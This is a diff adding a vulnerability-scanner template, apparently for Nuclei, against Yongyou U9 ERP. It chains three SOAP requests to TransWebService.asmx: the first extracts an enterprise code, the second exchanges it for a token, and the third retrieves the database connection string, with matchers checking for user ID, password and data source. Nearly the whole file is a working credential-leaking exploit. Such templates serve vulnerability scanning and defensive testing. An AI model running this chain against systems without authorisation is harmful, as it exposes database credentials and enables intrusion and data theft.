@@ -1,0 +1,112 @@
+id: yongyou-u9-getconnectionstring-info-leak
+info:
+  name: Yongyou U9 GetConnectionString Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    Vulnerability in Yongyou U9 that allows an attacker to obtain sensitive information such as database credentials via SOAP requests.
+
+variables:
+  code: ""
+  token: ""
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: extract-code
+    method: POST
+    path:
+      - "/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: http://tempuri.org/GetEnterprise
+    body: |-
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetEnterprise/>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"Code":'
+    extractors:
+      - type: regex
+        name: code
+        internal: true
+        group: 1
+        regex:
+          - '"Code":"(.*?)",'
+
+  - id: extract-token
+    method: POST
+    path:
+      - "/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml; charset=UTF-8
+      SOAPAction: http://tempuri.org/GetToken
+    body: |-
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetToken>
+         <tem:endId>{{code}}</tem:endId>
+      </tem:GetToken>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"Token":'
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '"Token":"(.*?)",'
+
+  - id: get-connection-string
+    method: POST
+    path:
+      - "/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml; charset=UTF-8
+      SOAPAction: http://tempuri.org/GetConnectionString
+    body: |-
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetConnectionString>
+         <tem:token>{{token}}</tem:token>
+      </tem:GetConnectionString>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "User Id="
+          - "Password="
+          - "Data Source="
+      - type: word
+        part: header
+        words:
+          - "application/soap+xml"
